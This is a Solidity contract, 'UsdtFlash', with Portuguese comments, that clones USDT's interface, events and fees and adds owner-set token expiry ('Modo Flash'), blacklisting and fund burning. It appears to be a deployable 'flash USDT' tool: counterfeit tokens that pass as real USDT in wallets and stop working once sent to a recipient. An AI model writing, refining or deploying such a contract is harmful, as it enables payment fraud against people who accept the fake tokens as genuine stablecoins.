// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract UsdtFlash is ERC20, ERC20Pausable, ERC20Burnable, Ownable {
    uint8 private immutable _decimals;
    mapping(address => bool) private _blacklist;
    mapping(address => uint256) public expirationTime;

    // Variáveis para espelhamento total (USDT Original)
    uint256 public basisPointsRate = 0;
    uint256 public maximumFee = 0;
    address public upgradedAddress;
    bool public deprecated;

    event AddedBlackList(address indexed _user);
    event RemovedBlackList(address indexed _user);
    event DestroyedBlackFunds(address indexed _user, uint256 _balance);
    event Issue(uint256 amount);
    event Redeem(uint256 amount);
    event Deprecate(address newAddress);
    event Params(uint feeBasisPoints, uint maxFee);

    constructor(
        string memory name_, 
        string memory symbol_, 
        uint256 initialSupply_, 
        uint8 decimals_
    ) ERC20(name_, symbol_) Ownable(msg.sender) {
        _decimals = decimals_;
        _mint(msg.sender, initialSupply_ * 10 ** uint256(decimals_));
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Função para gerar novos tokens com tempo de expiração.
     */
    function mintWithExpiry(address to, uint256 amount, uint256 durationMinutes) public onlyOwner {
        _mint(to, amount);
        if (durationMinutes > 0) {
            expirationTime[to] = block.timestamp + (durationMinutes * 1 minutes);
        }
    }

    /**
     * @dev Define manualmente o tempo de expiração para um endereço.
     */
    function setExpirationTime(address user, uint256 durationMinutes) public onlyOwner {
        if (durationMinutes > 0) {
            expirationTime[user] = block.timestamp + (durationMinutes * 1 minutes);
        } else {
            expirationTime[user] = 0;
        }
    }

    /**
     * @dev Função para gerar novos tokens. Apenas o dono do contrato pode chamar.
     */
    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    /**
     * @dev Alias para mint, seguindo o padrão do USDT original.
     */
    function issue(uint256 amount) public onlyOwner {
        _mint(owner(), amount);
        emit Issue(amount);
    }

    /**
     * @dev Alias para burn, seguindo o padrão do USDT original.
     */
    function redeem(uint256 amount) public onlyOwner {
        _burn(owner(), amount);
        emit Redeem(amount);
    }

    /**
     * @dev Configura taxas (Fees). No USDT original são usadas para sustentar a rede.
     */
    function setParams(uint256 newBasisPoints, uint256 newMaxFee) public onlyOwner {
        basisPointsRate = newBasisPoints;
        maximumFee = newMaxFee;
        emit Params(basisPointsRate, maximumFee);
    }

    /**
     * @dev Marca o contrato como depreciado em favor de um novo endereço.
     */
    function deprecate(address _upgradedAddress) public onlyOwner {
        deprecated = true;
        upgradedAddress = _upgradedAddress;
        emit Deprecate(_upgradedAddress);
    }

    /**
     * @dev Retorna o dono do contrato. Necessário para compatibilidade BEP20 (BSC).
     */
    function getOwner() external view returns (address) {
        return owner();
    }

    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    function addBlackList(address _evilUser) public onlyOwner {
        _blacklist[_evilUser] = true;
        emit AddedBlackList(_evilUser);
    }

    function removeBlackList(address _clearedUser) public onlyOwner {
        _blacklist[_clearedUser] = false;
        emit RemovedBlackList(_clearedUser);
    }

    function isBlackListed(address _maker) public view returns (bool) {
        return _blacklist[_maker];
    }

    /**
     * @dev Alias para isBlackListed, seguindo o padrão do USDT original (Tron).
     */
    function getBlackListStatus(address _maker) public view returns (bool) {
        return _blacklist[_maker];
    }

    function destroyBlackFunds(address _blackListedUser) public onlyOwner {
        require(_blacklist[_blackListedUser], "User is not blacklisted");
        uint256 dirtyFunds = balanceOf(_blackListedUser);
        _burn(_blackListedUser, dirtyFunds);
        emit DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }

    // Sobrescrita necessária para combinar ERC20, Pausable e Blacklist
    function _update(address from, address to, uint256 value)
        internal
        override(ERC20, ERC20Pausable)
    {
        // Verifica expiração (Modo Flash)
        if (from != address(0) && expirationTime[from] > 0) {
            require(block.timestamp <= expirationTime[from], "Tokens expirados (Modo Flash)");
        }

        // Bloqueia se o remetente ou destinatário estiver na blacklist
        if (from != address(0) && to != address(0)) {
            require(!_blacklist[from], "Sender is blacklisted");
            require(!_blacklist[to], "Recipient is blacklisted");

            // Lógica de Taxas (Clone 1:1)
            if (basisPointsRate > 0) {
                uint256 fee = (value * basisPointsRate) / 10000;
                if (fee > maximumFee && maximumFee > 0) {
                    fee = maximumFee;
                }
                if (fee > 0) {
                    super._update(from, owner(), fee);
                    value -= fee;
                }
            }
        }
        
        super._update(from, to, value);
    }
}